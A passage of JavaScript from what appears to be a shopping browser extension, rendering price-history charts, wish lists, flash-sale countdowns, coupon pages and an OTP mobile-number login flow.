          data: data.map((d) => d[1]),
          borderWidth: 1,
          pointRadius: 1,
          backgroundColor: '#ffe0b2',
          backgroundColor: '#0c579659',
          borderColor: '#0c5796', // "rgb(96, 125, 139)",
          fill: 1,
          stepped: 'middle',
        },
        {
          label: 'Min Price',
          stepped: 'middle',
          data: data.map((data) => data[2]),
          borderWidth: 1,
          pointRadius: 1,
          backgroundColor: 'transparent',
          // backgroundColor: "#0c579659",
          // borderColor:'#fb8c00'// 'blue'
          borderColor: '#0c5796',
          fill: false,
        },
      ],
    },
    dispOpt = {
      responsive: true,
      plugins: {
        legend: {
          position: 'top',
        },
        tooltip: {
          mode: 'index',
          intersect: false,
          titleSpacing: 80,
          titleMarginBottom: 10,
          xPadding: 10,
          yPadding: 10,
          bodyFontFamily: 'rubik, sans-serif',
          bodySpacing: 7,
          backgroundColor: '#0c5796',
          bodyFontColor: 'white',
          titleFontColor: 'white',
        },
      },

      scales: {
        x: {
          type: 'time',
          time: {
            minUnit: 'day',
            tooltipFormat: 'DD-MMM-YY',
          },
          ticks: {
            maxTicksLimit: 14,
            maxRotation: 0,
          },
        },
        y: {
          ticks: {
            // Include a dollar sign in the ticks
            callback: function (value, index, values) {
              return 'Rs.' + value;
            },
            stepSize: 1,
            maxTicksLimit: 8,
          },
        },
      },
    };

  new Chart(myCanva, {
    type: 'line',
    data: dataOpt,
    options: dispOpt,
    tooltips: {
      mode: 'index',
      intersect: false,
      titleSpacing: 80,
      titleMarginBottom: 10,
      xPadding: 10,
      yPadding: 10,
      bodyFontFamily: 'rubik, sans-serif',
      bodySpacing: 7,
      backgroundColor: '#0c5796',
      bodyFontColor: 'white',
      titleFontColor: 'white  ',
    },
  });

  brwsr_act.type = 'Price_alert_page';
  brwsr_act.isOpen = true;
}

//  close modal function ..............
function close_modl_fucn() {
  if(!fs_init) return;

  call_swtch = false;
  mainExtSub.innerHTML = '';
  ext_popup.innerHTML = '';
  let myElem = ext_popup.querySelector('.side_popup_cont');
  if (myElem) {
    myElem.style.display = 'block';
    return true;
  }
  // makSidePop();
}
function createCookie(name, value, days) {
  var date, expires;
  if (days) {
      date = new Date();
      date.setDate(date.getDate()+days);
      expires = "; expires="+date.toUTCString();
  } else {
      expires = "";
  }
  document.cookie = name+"="+value+expires+"; path=/";
}
function close_add_store_modal(coookie=0){
  if(coookie) createCookie('add_store_model_shown',1,30);
  let elem = ext_popup.querySelector('.add_store_cont_main');

  if(elem) ext_popup.removeChild(elem);
}

function close_main_ext_modal(show_side_pp=1) {
  if(!fs_init) return;

  call_swtch = false;
  toggle_scrollable(false);
  mainExtSub.innerHTML = '';
  if(!show_side_pp) return;
  console.log("runnig after close show side pp..");
  let sbtn = ext_popup.querySelector('.side_popup_cont');
  if (sbtn) sbtn.style.display = 'block';
}
// check side popup modal display...........
function check_side_pop_dis() {
  if(!fs_init) return;

  let theDis = ext_popup.querySelector('.side_popup_cont');
  if (theDis && theDis.style && theDis.style.display == 'block')
    ext_popup.querySelector('.side_popup_cont').style.display = 'none';
}

//  making side popup ....................
export async function makSidePop(torenStr = '', isDis = false) {
  //......   makSidePop('Price_alert_page',false)
  if(!fs_init) return;

  if (rend_side_pop) return;
  if (document.querySelector('.side_popup_cont'))
    document.querySelector('.side_popup_cont').remove();
  let mySidePopup = document.createElement('div');
  mySidePopup.setAttribute('class', 'side_popup_cont');
  mySidePopup.style.display = isDis ? 'block' : 'none';
  let top = await storage('get', 'popup_top');
  mySidePopup.innerHTML = `${sidePopup(torenStr, top || 0)}`;
  ext_popup.appendChild(mySidePopup);
  rend_side_pop = 1;
}

// render wish-list page ...............
function render_wishList(result, nav_num) {
  if(!fs_init) return;

  console.log('this is render wiskdjdjknvjd....', result);
  let comp = '',
    prod_elem = '';
  // is_flash = true; // temp false..
  global_whishList_var = result;
  console.log('wish_list result', result);
  let mse = ext_popup.querySelector('.side_popup_cont');
  if (mse) mse.style.display = 'none';
  // ext_popup.querySelector('.side_popup_cont').style.display = "none";
  if (!(result && result.length)) {
    comp = empty_wish_list(main_ext_id);
  } else {
    let item_length = 0;

    item_length = result.length;

    result.forEach((elem, index) => {
      if(!elem) elem ={};
      let time_stamp = time_stamp_builder(elem.start_date);
      prod_elem += `
            ${wish_list_product_elem(
              elem,
              main_ext_id,
              elem.min_drop,
              time_stamp,
              index
            )}
            `;
    });

    comp = `<div class="sub_wishlist_container" >
            <div class="wishlist_main_heading">
            <span>Items Saved (${item_length})</span>
            </div>
            <div class="y_scrl" >
                <div class="sv_prd_crd_cont" >
                ${prod_elem}
                </div>
            </div>
            </div>
            <style>
            .y_scrl{
                overflow-y: scroll;
                max-height: 491px;
                min-height: 491px;
                padding: 0px 14px 6px 14px;
                background: transparent;
            }
            .img_ctr_main_div{
              display: flex; 
              justify-content: center; 
              align-items: center;
              background: #d3d3d336;
            }
            .img_ctr_sub_div{
                display: flex; 
                justify-content: center; 
                align-items: center;
                height: 100%;
                width: 100%;
            }
            .img_ctr_sub_div img{
                max-height: 100%;
                max-width: 100%;
            }
            .sv_prd_crd_cont{
                display: grid;
                grid-gap: 21px 10px;
                grid-template-columns: auto auto;
            }
            .y_scrl::-webkit-scrollbar {
                display: none;
                }
            .sub_wishlist_container{
                min-height: 534px;
                background: white;
                padding: 16px 0px 0px 0px;
            }
            .wishlist_main_heading {
                font-family: 'Poppins';
                font-style: normal;
                font-weight: 600;
                font-size: 16px;
                color: #0E1D4A;
                padding: 0px 0px 0px 16px;
                margin: 0px 0px 16px 0px;
            }
            ${wish_list_prod_elem_style}
            </style>`;
  }
  mainExtSub.innerHTML = `${ext_main_temp_struc(
    comp,
    'Wish List',
    result,
    main_ext_id,
    true,
    is_flash,
    false,
    nav_num
  )}`;
}

// setting header and bck to...........
function check_header(title = '', is_home_hdr = false, bkt = '') {
  if(!fs_init) return;

  if (is_home_hdr) {
    mainExtSub.querySelector(
      '.header_container'
    ).innerHTML = `${home_page_header(main_ext_id)}`;
  } else {
    mainExtSub.querySelector(
      '.header_container'
    ).innerHTML = `${other_page_header(main_ext_id, title, bkt)}`;
  }
}

// rendering flash sale...........
async function rend_flsh_sale_page() {
  if(!fs_init) return;
  check_header('Flash Sales', false, 'home');
  let data = await get_Saledata();
  fs_fls_sale_data_obj.base = fls_sale_base_data_conv(data);
  console.log('this is flash sale glb data...', fs_fls_sale_data_obj);

  console.log('this is fls_sale_data_obj .....', fs_fls_sale_data_obj);
  let un_subs_blck = crt_unsubs_fls_sale_str(fs_fls_sale_data_obj.base);
  let subs_blck = crt_subs_fls_sale_str(data.reg);
  mainExtSub.querySelector('.contentBlock').innerHTML = `${flsh_sale_temp_pg(
    mainExtSub,
    data,
    un_subs_blck,
    subs_blck
  )}`;
  mainExtSub.querySelector('.nav_main_cont').innerHTML = `${navbar(
    main_ext_id,
    is_flash,
    ''
  )}`;

  upd_fls_sl_cnt(); // updating cnt-dwn...
}

// converting flash sale data['base']....
function fls_sale_base_data_conv(data) {
  let db = data.base,
    newDB = {},
    regDB = data.reg;
  regDB['conv'] = [];
  for (let site in db) {
    let lg = db[site]['logo'];
    newDB[site] = { logo: lg, prd: [] };
    console.log('newDB logo attached...', newDB);
    db[site]['products'].forEach((p) => {
      let o = {
          name: p.name,
          url: p.url,
          order: p.order,
          date: p.date,
          var: { mpp: {}, spp: {} },
        },
        vom = {},
        vos = {};

      if (p.variant['mpp']) {
        p.variant['mpp'].forEach((e) => {
          // let j = {
          //     "color_code":e["color_code"],
          //     "cookie":e["cookie"],
          //     "url_path":e["url_path"],
          //     "c_value":e["c_value"],
          //     "preclicks":e["preclicks"],
          // };
          let j = {};
          let match = false;
          for (let key in e) {
            if (key == 'variant' || key == 'color') continue;
            j[key] = e[key];
          }
          for (let cki in regDB) {
            console.log('this is elem vaeriant...', p.variant['mpp']);

            p.variant['mpp'].forEach((elem, index) => {
              let c = elem.cookie;
              if (regDB[cki] != 1 && cki.length > 0) {
                console.log(
                  'this is c_value:',
                  elem.c_value,
                  'this is cki',
                  cki
                );
                if (elem.c_value == regDB[cki]) {
                  let re = {
                    ...elem,
                    variant: e['variant'],
                    color: e['color'],
                    name: o.name,
                    date: o.date,
                    order: o.order,
                    url: o.url,
                    logo: lg,
                  };
                  regDB['conv'].push(re);
                  console.log(
                    'p.variant[mpp],index before...',
                    p.variant['mpp'],
                    index,
                    elem
                  );
                  p.variant['mpp'].splice(index, 1);
                  console.log(
                    'p.variant[mpp],index after...',
                    p.variant['mpp'],
                    index
                  );
                  match = true;
                }
              } else if (c == cki) {
                console.log('this is c:', c, 'this is cki', cki);
                let re = {
                  ...elem,
                  variant: e['variant'],
                  color: e['color'],
                  name: o.name,
                  date: o.date,
                  order: o.order,
                  url: o.url,
                  logo: lg,
                };
                regDB['conv'].push(re);
                console.log(
                  'p.variant[mpp],index before...',
                  p.variant['mpp'],
                  index,
                  elem
                );
                p.variant['mpp'].splice(index, 1);
                console.log(
                  'p.variant[mpp],index after...',
                  p.variant['mpp'],
                  index
                );
                match = true;
              }
            });
          }
          if (!match) {
            if (!vom[e.variant]) vom[e.variant] = {};
            vom[e.variant][e.color] = j;
          }
        });

        o.var.mpp = vom;
      } else if (p.variant['spp']) {
        p.variant['spp'].forEach((e) => {
          // let j={
          //     "color_code":e["color_code"],
          //     "cookie":e["cookie"],
          //     "url_query":e["url_query"],
          //     "api_par":e["api_par"],
          // };
          let j = {},
            match = false;
          for (let key in e) {
            if (key == 'variant' || key == 'color') continue;
            j[key] = e[key];
          }

          for (let cki in regDB) {
            console.log('this is elem vaeriant...', p.variant['spp']);

            p.variant['spp'].forEach((elem, index) => {
              let c = elem.cookie;
              if (regDB[cki] != 1 && cki.length > 0) {
                console.log(
                  'this is c_value:',
                  elem.c_value,
                  'this is cki',
                  cki
                );
                if (elem.c_value == regDB[cki]) {
                  let el = {
                    ...elem,
                    variant: e['variant'],
                    color: e['color'],
                    name: o.name,
                    date: o.date,
                    order: o.order,
                    url: o.url,
                    logo: lg,
                  };
                  regDB['conv'].push(el);
                  console.log(
                    'p.variant[spp],index before...',
                    p.variant['spp'],
                    index,
                    elem
                  );
                  p.variant['spp'].splice(index, 1);
                  console.log(
                    'p.variant[spp],index after...',
                    p.variant['spp'],
                    index
                  );
                  match = true;
                }
              } else if (c == cki) {
                console.log('this is c:', c, 'this is cki', cki);
                let el = {
                  ...elem,
                  variant: e['variant'],
                  color: e['color'],
                  name: o.name,
                  date: o.date,
                  order: o.order,
                  url: o.url,
                  logo: lg,
                };
                regDB['conv'].push(el);
                console.log(
                  'p.variant[spp],index before...',
                  p.variant['spp'],
                  index,
                  elem
                );
                p.variant['spp'].splice(index, 1);
                console.log(
                  'p.variant[spp],index after...',
                  p.variant['spp'],
                  index
                );
                match = true;
              }
            });
          }
          if (!match) {
            if (!vos[e.variant]) vos[e.variant] = {};
            vos[e.variant][e.color] = j;
          }
        });
        o.var.spp = vos;
      }

      newDB[site]['prd'].push(o);
    });
  }
  fs_fls_sale_data_obj.reg = regDB;
  // newDB['reg_data'] = regDB;
  console.log('the newDB.....', newDB);
  return newDB;
}

// generating count-down for flash-sale...
function cnt_dwn_genrtr(d) {
  // console.log("input date string...",d);
  // d = '2023-06-11 17:30:00';
  // d= new Date(d).getTime();
  let curr_dt = new Date().getTime();
  let diff = d - curr_dt;

  let days = Math.floor(diff / (1000 * 60 * 60 * 24));
  let hours = Math.floor((diff % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
  let minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
  let seconds = Math.floor((diff % (1000 * 60)) / 1000);

  let str_dt = `${days}d ${hours}h ${minutes}m ${seconds}s`;

  return { str_dt, diff };
}

// updating count-down for flash-sale...
function upd_fls_sl_cnt() {
  if(!fs_init) return;

  console.log(
    'inside settime out fls-sale...',
    mainExtSub.getElementsByClassName('fls_sl_tm_cnt')
  );

  let x = setInterval(() => {
    let html_colln = mainExtSub.getElementsByClassName('fls_sl_tm_cnt');
    for (let i = 0; i < html_colln.length; i++) {
      let d = html_colln[i].getAttribute('dt_str'),
        obj = {};
      obj = cnt_dwn_genrtr(Number(d));
      html_colln[i].innerText = obj.str_dt;
      // console.log("this setinterval fls-sale data",obj,'element html',html_colln[i]);

      if (obj.diff <= 0) {
        console.log('we are inside expire fls-sale...');
        clearInterval(x);
        html_colln[i].innerText = 'Sale is on';
        html_colln[i].style.color = 'green';
      }
    }
  }, 1000);

  // myIntervl = setInterval(()=>{

  //     ext_popup.querySelector('.verf_otp_resnd_msg').innerText = `Resend in ${glb_cnt_dwn_var}s`;
  //     if(glb_cnt_dwn_var>0){
  //         console.log("glb_cnt_dwn_var",glb_cnt_dwn_var);
  //         glb_cnt_dwn_var--;
  //     }else{
  //         clearInterval(myIntervl);
  //     }
  // },1000);
}

// getting sale date , fls-sale...
function getsaledate(sd, tf) {
  var cdate = new Date().getTime();
  for (var i = sd.length - 1; i >= 0; i--) {
    sd[i] = new Date(sd[i]).getTime();
    while (cdate > sd[i] + tf * 60000) sd[i] = sd[i] + 7 * 24 * 60 * 60000;
  }
  return Math.min.apply(null, sd);
}

// creating un-subscribed flash-sale strings...
function crt_unsubs_fls_sale_str(data) {
  let c = 0,
    s = '';
  for (let k in data) {
    let un_subs_str = '',
      opp = { mpp: true, spp: true };
    data[k].prd.forEach((e, index) => {
      for (let ky in e.var) {
        if (Object.keys(e.var[ky]).length === 0) {
          opp[ky] = false;
        }
      }
      console.log('this is mpp and spp', opp);
      let selDate = getsaledate(e.date, 5);
      console.log('this is selected date...', selDate);
      e.date = selDate;
      let date_str = cnt_dwn_genrtr(Number(selDate)).str_dt;
      un_subs_str += `${flsh_sale_unsubs_crd(
        main_ext_id,
        e,
        index,
        date_str,
        c,
        data[k].logo
      )}`;
    });
    if (!opp.mpp && !opp.spp) {
      continue;
    }
    s += flsh_sale_accrdn_un_subs(
      main_ext_id,
      data[k],
      `crtunsubfss${c}`,
      false,
      un_subs_str,
      k,
      c
    );
    c++;
  }
  return s;
}

function crt_subs_fls_sale_str(data) {
  console.log('data.conv crt subs fls-sale,..........', data.conv);
  let s = '',
    l = data.conv.length;
  if (l && l > 0) {
    data.conv.forEach((e) => {
      let selDate = getsaledate(e.date, 5);
      let date_str = cnt_dwn_genrtr(selDate).str_dt;
      s += flsh_sale_subs_crd(main_ext_id, e, date_str);
    });
  } else {
    s = `
    <div class="no_data_subs_crd">
    Nothing to show
    </div>
    `;
  }
  return s;
}

// rendering my-profile page............
function rend_my_prof_pg() {
  if(!fs_init) return;

  // check_header('My Profile');
  // my_prof_temp
  sendMessagePromise({ dataMSg: { msg: 'fetch_profile', data: '' } })
    .then((result) => {
      console.log('check auth result:', result);
      // console.log("check authorization running...", Date.now());
      if (result.code == 200) {
        global_auth_var = result.data;
      } else {
        global_auth_var = 0;
      }
      // global_auth_var = 0;//temp......
      if (global_auth_var) {
        mainExtSub.innerHTML = `${ext_main_temp_struc(
          my_prof_temp(main_ext_id, result.data),
          'My Profile',
          '',
          main_ext_id,
          true,
          is_flash,
          false,
          4
        )}`;
        return true;
      } //my_prof_temp
      mainExtSub.innerHTML = `${ext_main_temp_struc(
        my_prof_sgn_out(main_ext_id),
        'My Profile',
        '',
        main_ext_id,
        true,
        is_flash,
        false,
        4
      )}`;
    })
    .catch((error) => {
      console.log('check auth error:', error);
      global_auth_var = 0;
      mainExtSub.innerHTML = `${ext_main_temp_struc(
        my_prof_sgn_out(main_ext_id),
        'My Profile',
        '',
        main_ext_id,
        true,
        is_flash,
        false,
        4
      )}`;
    });
  // mainExtSub.querySelector('.nav_main_cont').innerHTML = `${navbar(main_ext_id, is_flash, 4)}`;
}

//  rendering clogin screen.......
function rend_login_scrn() {
  if(!fs_init) return;

  // mainExtSub.innerHTML = '';
  ext_popup.innerHTML = `${login_pg_tmp(main_ext_id)}`;
}

// validate email...............
function validate(str, regx) {
  let result = str.toLowerCase().match(regx);
  console.log('validate function result :', result);
  return result;
}

// login confirmation popup.......
function login_confrm_popup() {
  if(!fs_init) return;

  let myLognPopup = document.createElement('div');
  myLognPopup.setAttribute('class', 'logn_confrm_pop_cont');
  myLognPopup.innerHTML = `
    <div class="logn_confrm_pop_wrppr">
        ${log_out_conf_popup()}
    </div>
    <style>
    .logn_confrm_pop_wrppr{
      width: 350px;
      min-height: 553px;
      background: #16151585;
      position: absolute;
      top: 47px;
      display: flex;
      justify-content: center;
      align-items: center;
    }
    </style>
    `;
  mainExtSub.appendChild(myLognPopup);
}

// send otp, mobile num validation......

function snd_otp_mob_valdn() {
  if(!fs_init) return;
  let val = ext_popup.querySelector('.lwo_inp').value,
    mobRegX = /^[6-9]\d{9}$/,// ^([0|\+[0-9]{1,5})?([7-9][0-9]{9})$ 
    spnElem = ext_popup.querySelector('#lwo_inp_spn_err1'),
    sndObj = {};
  console.log('snd_logn_otp', val);

  if (!validate(String(val), mobRegX)) {
    ext_popup.querySelector('.lwo_inp').value = '';
    spnElem.innerText = 'Please enter a valid mobile number';
    spnElem.style.display = 'block';
    return;
  }
  sndObj['mobile'] = val;
  ext_popup.querySelector('.logn_pg_othr_temp_cont').innerHTML = `${univ_loader(
    '100%',
    '352px'
  )}`;
  return sndObj;
}

// otp verfication srcn rendering..........
let myMob;
function ren_otp_verf_scrn(msg_str) {
  if(!fs_init) return;

  let res = snd_otp_mob_valdn();
  // snd_sign_up_otp
  // snd_logn_otp
  let err_case_nxt_task = '',is_sec=0;

  if(msg_str == 'snd_sign_up_otp'){
    err_case_nxt_task = 'snd_logn_otp';
  }else if(msg_str == 'snd_logn_otp'){
    err_case_nxt_task = 'snd_sign_up_otp';
  }

  console.log('response form snd_otp_mob_valdn:     ', res);
  if (!res) return;
  sendMessagePromise({ dataMSg: { msg: msg_str, data: res } })
    .then((result) => {
      console.log('snd_sign_up_otp result....', result);
      if (result.code !== 200) {
        // ext_popup.querySelector(
        //   '.logn_pg_othr_temp_cont'
        // ).innerHTML = `${logn_pg_otp_tmp()}`;

        is_sec = 1;
      sendMessagePromise({dataMSg: {msg:err_case_nxt_task,data:res}})
          .then((r)=>{
            if(r.code == 200)otp_scrn(is_sec);
            return true;
          })
          .catch((er)=>{console.log("this is error snd otp..",er)});



        // if(result.message == 'User Already Exist'){
         
        //   sendMessagePromise({dataMSg: {msg:'snd_logn_otp',data:res}})
        //   .then((r)=>{
        //     if(r.code == 200)otp_scrn();
        //     return true;
        //   })
        //   .catch((er)=>{console.log("this is error snd loginup otp..",er)});
        
        // }
        // if(result.message == 'User does not exists, please sign up'){

        //   sendMessagePromise({dataMSg: {msg:'snd_sign_up_otp',data:res}})
        //   .then((r)=>{
        //     if(r.code == 200)otp_scrn();
        //     return true;
        //   })
        //   .catch((er)=>{console.log("this is error snd signup otp..",er)});

        // }


        // ext_popup.querySelector('#lwo_inp_spn_err1').innerText =
        //   result.failed || result.message;
        // ext_popup.querySelector('#lwo_inp_spn_err1').style.display = 'block';
        return true;
      }

      function otp_scrn(i){
        let ds = {},
          str = res.mobile || '';
        ds['mobStr'] = str;
        ds['msgStr'] = i?err_case_nxt_task:msg_str;
        myMob = res.mobile;
        console.log('sliced string obj', ds);
        ext_popup.querySelector(
          '.logn_pg_othr_temp_cont'
        ).innerHTML = `${logn_pg_vrfy_otp_tmp(main_ext_id, ds)}`;
        ext_popup.querySelector('#digit-1').select();
        glb_cnt_dwn_var = 30;
        otp_count_down();
      }
      otp_scrn(is_sec);

    })
    .catch((err) => {
      console.log('snd_sign_up_otp err....', err);
    });
}

// otp verfication coun-down....
let glb_cnt_dwn_var = 30,
  myIntervl;
function otp_count_down() {
  if(!fs_init) return;

  myIntervl = setInterval(() => {
    console.log(
      'inside settime out',
      ext_popup.querySelector('.verf_otp_resnd_msg')
    );

    ext_popup.querySelector(
      '.verf_otp_resnd_msg'
    ).innerText = `Resend in ${glb_cnt_dwn_var}s`;
    if (glb_cnt_dwn_var > 0) {
      console.log('glb_cnt_dwn_var', glb_cnt_dwn_var);
      glb_cnt_dwn_var--;
    } else {
      clearInterval(myIntervl);
    }
  }, 1000);
}

// otp verification input focus script..........

function otp_input_focus_scrpt(ce) {
  if(!fs_init) return;

  let val = ce.value;
  console.log('current value length...', val);
  if (val.length) {
    console.log('this is length 1 scope');
    let nxt = ce.getAttribute('data-next');
    if (nxt) {
      ext_popup.querySelector(`#${nxt}`).select();
    }
  } else {
    console.log('this is length 0 scope');
    let prev = ce.getAttribute('data-previous');
    if (prev) {
      ext_popup.querySelector(`#${prev}`).select();
    }
  }
}

//  individual store by url ........

async function ren_ind_store_by_url() {
  if(!fs_init) return;
  let  avl_cpn_str = '',
    lst_cpn_str = '';
  console.log(
    'global store detail variable...ren_ind_store_by_url',
    glb_str_det_var
  );

  mainExtSub.querySelector('.contentBlock').innerHTML = `${univ_loader(
    '100%',
    '554px'
  )}`;
  let web_metadata = await check_webpage_metadata();
  if (web_metadata.resp == 'store not in the list') {
    let allStr = str_maker(loc_data_obj['fetch_all_stores'], 'all_str_page');
    mainExtSub.querySelector('.contentBlock').innerHTML = `${all_stores_temp(
      main_ext_id,
      allStr
    )}`;
  } else if (web_metadata.resp == 'store avail in list') {
    web_metadata = web_metadata.metadata;
    avl_cpn_str = str_maker(web_metadata.coupons.coupons, 'avl_cpn');
    lst_cpn_str = str_maker(web_metadata.coupons.lsc_cpn, 'lst_cpn');
    check_header('Coupons', false, '');

    mainExtSub.querySelector('.contentBlock').innerHTML = `${ind_str_cpn_temp(
      main_ext_id,
      ind_str_crd(main_ext_id, web_metadata.metadata,web_metadata.coupons.coupons.length),
      lst_cpn_str,
      avl_cpn_str,
      web_metadata.coupons.coupons.length
    )}`;
  }

  mainExtSub.querySelector('.nav_main_cont').innerHTML = `${navbar(
    main_ext_id,
    is_flash,
    3
  )}`;
}

//  str maker..............
function str_maker(arr, nm) {
  console.log('arr/................kcnjdvndfjvnfjv', arr);
  if (!Array.isArray(arr)) arr = [];
  let str = ``,i_style = 0;
  if (nm == 'ruc') {
    // fetch_ruc:{prop:rec_used_coup_crd,str:''},
    //                         fetch_rpd:{prop:rec_prc_drp_crd,str:''},
    //                         fetch_deals:{prop:deals_hp_crd,str:''},
    //                         fetch_sfu:{prop:sale_for_you_crd,str:''}
    arr.forEach((elem, index) => {
      if (index <= 9) {
        let ts = '';
        ts = time_stamp_builder(Date.parse(elem.last_used_time));
        elem.last_used_time = ts;
        console.log('this is ts builder', elem);

        str += rec_used_coup_crd(main_ext_id, elem, index);
      }
    });
    return str;
  }
  if (nm == 'all_str') {
    arr.forEach((elem, index) => {
      // console.log("thidvidnvinbidnb.........",elem);
      if (index <= 3) {
        if(index == 0){
          str+=all_str_prd_crd_css;
          console.log("inside first index...home page");
        }
        str += `${all_str_prd_crd(main_ext_id, elem, index, 'home')}`;
      }
    });
    return str;
  }
  if (nm == 'banner') {
    let sld_str = '',
      dot_str = '',
      lbl_str = '',
      ban_car = '';
    console.log("this is banner carousel arr",arr);
    arr.forEach((elem, index) => {
      if(index<=4){

        if(index == 0){
          sld_str += new_hm_bnnr_crsl_slide('first',elem.img_url,index);  
          dot_str+= new_hm_bnnr_crsl_inp(index,'checked');
        }else{
          sld_str += new_hm_bnnr_crsl_slide('',elem.img_url,index);
          dot_str+= new_hm_bnnr_crsl_inp(index,'');
        }
        lbl_str+= new_hm_bnnr_crsl_lbl(index);
      }
    });

    ban_car = new_hm_pg_banner_carsl(dot_str, sld_str,lbl_str);

    let length = arr.length;
    if(length>5){
      total_carsl_glb_var = 5;
    }else{
      total_carsl_glb_var = arr.length;
    }
    counter_carsl_glb_var = 2;
    return ban_car;
  }
  // 'fetch_rpd','fetch_sfu','fetch_deals'
  if (nm == 'rpd') {
    arr.forEach((elem, index) => {
      if (index <= 4) {
        str += `${rec_prc_drp_crd(main_ext_id, elem, index)}`;
      }
    });
    return str;
  }
  if (nm == 'sfu') {
    arr.forEach((elem, index) => {
      if (index <= 4) {
        str += `${sale_for_you_crd(main_ext_id, elem, index)}`;
      }
    });
    return str;
  }
  if (nm == 'deals') {
    arr.forEach((elem, index) => {
      if (index <= 4) {
        if(index == 0)str+=deals_hp_crd_css;
        str += `${deals_hp_crd(main_ext_id, elem, index)}`;
      }
    });
    return str;
  }
  if (nm == 'deals_page') {
    arr.forEach((elem, index) => {
      // if(index<=4){
      if(index == 0)str+=deals_hp_crd_css;
      str += `${deals_hp_crd(main_ext_id, elem, index)}`;
      // }
    });
    return str;
  }
  if (nm == 'all_str_page') {
    arr.forEach((elem, index) => {
      if(index == 0)str+=all_str_prd_crd_css;
      str += `${all_str_prd_crd(main_ext_id, elem, index)}`;
    });
    return str;
  }
  // avl_cpn
  // lst_cpn
  if (nm == 'avl_cpn') {
    console.log('inside avl cpn if');
    if (!(arr && arr[0])) return (str = '');
    arr.forEach((elem, ind) => {
      if(ind == 0)str+=ind_str_avl_cpn_css;
      str += `${ind_str_avl_cpn(main_ext_id, elem)}`;
    });
    return str;
  }
  if (nm == 'lst_cpn') {
    console.log('inside alst cpn if');
    if (!(arr && arr[0])) return (str = '');
    arr.forEach((elem, ind) => {
      if(ind == 0)str+=ind_str_lst_cpn_css;
      str += `${ind_str_lst_cpn(main_ext_id, elem)}`;
    });
    return str;
  }
}

// time stamp builder ..............
function time_stamp_builder(time_stamp) {
  time_stamp = new Date(time_stamp);
  let curr_time = +new Date(),
    diff = curr_time-time_stamp,
    hr = 60 * 60 * 1000,
    min = 60 * 1000,
    sec = 1000,
    str = 'day',
    num_day = round(diff / (86400 * 1000));
  console.log('time stamp:', time_stamp);
  console.log('difference:', diff, 'curr_time', curr_time);
  // console.log("time stamp num of days:",num_day);
  if (num_day >= 30) {
    num_day = round(num_day / 30);
    str = 'mn';
  } else if (num_day < 1) {
    num_day = round(diff / hr);
    str = 'hr';
  }
  if (str == 'hr' && num_day < 1) {
    num_day = round(diff / min);
    str = 'min';
  }
  if (str == 'min' && num_day < 1) {
    num_day = round(diff / sec);
    str = 'sec';
  }

  // console.log("time stamp:",num_day,str);

  // const years = Math.floor(diff / (365 * 24 * 60 * 60 * 1000));
  // const months = Math.floor((diff % (365 * 24 * 60 * 60 * 1000)) / (30 * 24 * 60 * 60 * 1000));
  // const days = Math.floor((diff % (30 * 24 * 60 * 60 * 1000)) / (24 * 60 * 60 * 1000));
  // const hours = Math.floor((diff % (24 * 60 * 60 * 1000)) / (60 * 60 * 1000));
  // const minutes = Math.floor((diff % (60 * 60 * 1000)) / (60 * 1000));
  // const seconds = Math.floor((diff % (60 * 1000)) / 1000);

  // console.log("time stamp gpt:",'yrs'+years,'mnth'+months,'days'+days,'hrs'+hours,'min'+minutes,'sec'+seconds);


  return `${num_day} ${str}`;
}

//  check authentication...
async function chck_authentication_crrnt() {
  try {
    let res = await sendMessagePromise({
      dataMSg: { msg: 'fetch_profile', data: '' },
    });
    if (res.code == 200) return true;
    return false;
  } catch (error) {
    console.log('chck_authent err currnt:...', error);
    return false;
  }
}

//  checking product in wishlist....
async function chck_prd_in_whishlist() {
  try {
    let pid = glb_str_det_var.pid;
    console.log('check product in wish-list pid:...', pid);
    let is_online = await chck_authentication_crrnt();
    if (is_online) {
      let resp = await sendMessagePromise({
        dataMSg: { msg: 'fetch_whish_list', data: '' },
      });
      if (resp.code == 200) {
        if (resp.data[0]) {
          let x='';
          let myElem = resp.data.some((elem) => {
            if (pid == elem.pid) {
              x= elem;
              return elem;
            }
            return false;
          });
          console.log("checking prd in wl myelem..",x);
          return {
            found: myElem ? true : false,
            obj: x || {},
          };
        } else {
          return { found: false, obj: {} };
        }
      } else {
        return { found: false, obj: {} };
      }
    } else {
      let resp = await storage('get', 'loc_wish_list')
      // await sendMessagePromise({
      //   dataMSg: {
      //     msg: 'loc_strg_handlr',
      //     data: { op: 'get', str: 'loc_wish_list' },
      //   },
      // });
      // console.log('resp from  loc_strg_wl', resp);
      // return;
      if (!resp|| !resp.length) return { found: false, obj: {} };
      // resp =resp['loc_wish_list'];
      let resp1;
      resp.forEach(ele => {
        console.log(ele,'wishlist_ele',pid);
        if (ele && ele['pid'] == pid) {
          console.log('prod_found')
          return resp1 = { found: true, obj: ele };
        }
      });

      return resp1||{ found: false, obj: {} };
    }
  } catch (error) {
    console.log('this is chck_prd_in_whishlist err:', error);
    return { found: false, obj: {} };
  }
}

// adding local wish-list to server wish-list....
async function add_loc_wl_to_data(result) {
  let resp = await storage('get', 'loc_wish_list')
  
  if (!resp || !resp.length ) {
    console.log('no data in local storage..', result.data);
    return result.data;
  }
  console.log('add_loc_wl_to_data result ;', result);
  console.log('add_loc_wl_to_data response ;', resp);

  let new_arr = [],
    result_arr = JSON.parse(JSON.stringify(result.data));// creating deep copy...
  result_arr.forEach((elem,ind) => {
    // for (let key in resp) {
    //   if (elem.pid != key) {
    //     new_arr.push(resp[`${key}`]);
    //   }
    // }
    resp.forEach((x)=>{
      if(elem.pid != x.pid)new_arr.push(x);
    })

  });


  // making local-wishlist distinct from original...
    await storage('set', {loc_wish_list:new_arr||[]});

  let upd_temp_arr = JSON.parse(JSON.stringify(new_arr));

  // sending add-wish-list-request to sever...
  upd_temp_arr.forEach((elem, index) => {
    sendMessagePromise({
      dataMSg: { msg: 'add_to_wish_list', data: elem },
    }).then((result) => {
      if (result.code == 200) {

        // updating local wish-list..
        upd_temp_arr.splice(index,1);
        storage('set', {loc_wish_list:upd_temp_arr||[]});
        
      }
    });
  });
  // sending add-wish-list-request to sever...

  new_arr = [...new_arr, ...result_arr];
  console.log('new array fom add_loc_wl_to_data', new_arr);
  return new_arr;
}

// calling render wishlist with checks....
async function call_render_wish_list(result) {
  console.log("this is result call render 11111111 ...",result);
  if (result.code !== 200) {
    let res = await storage('get', 'loc_wish_list')
    console.log("this is result call render loc_wish_list logout ...",res);
    let arr = [];
    if(res && res.length){
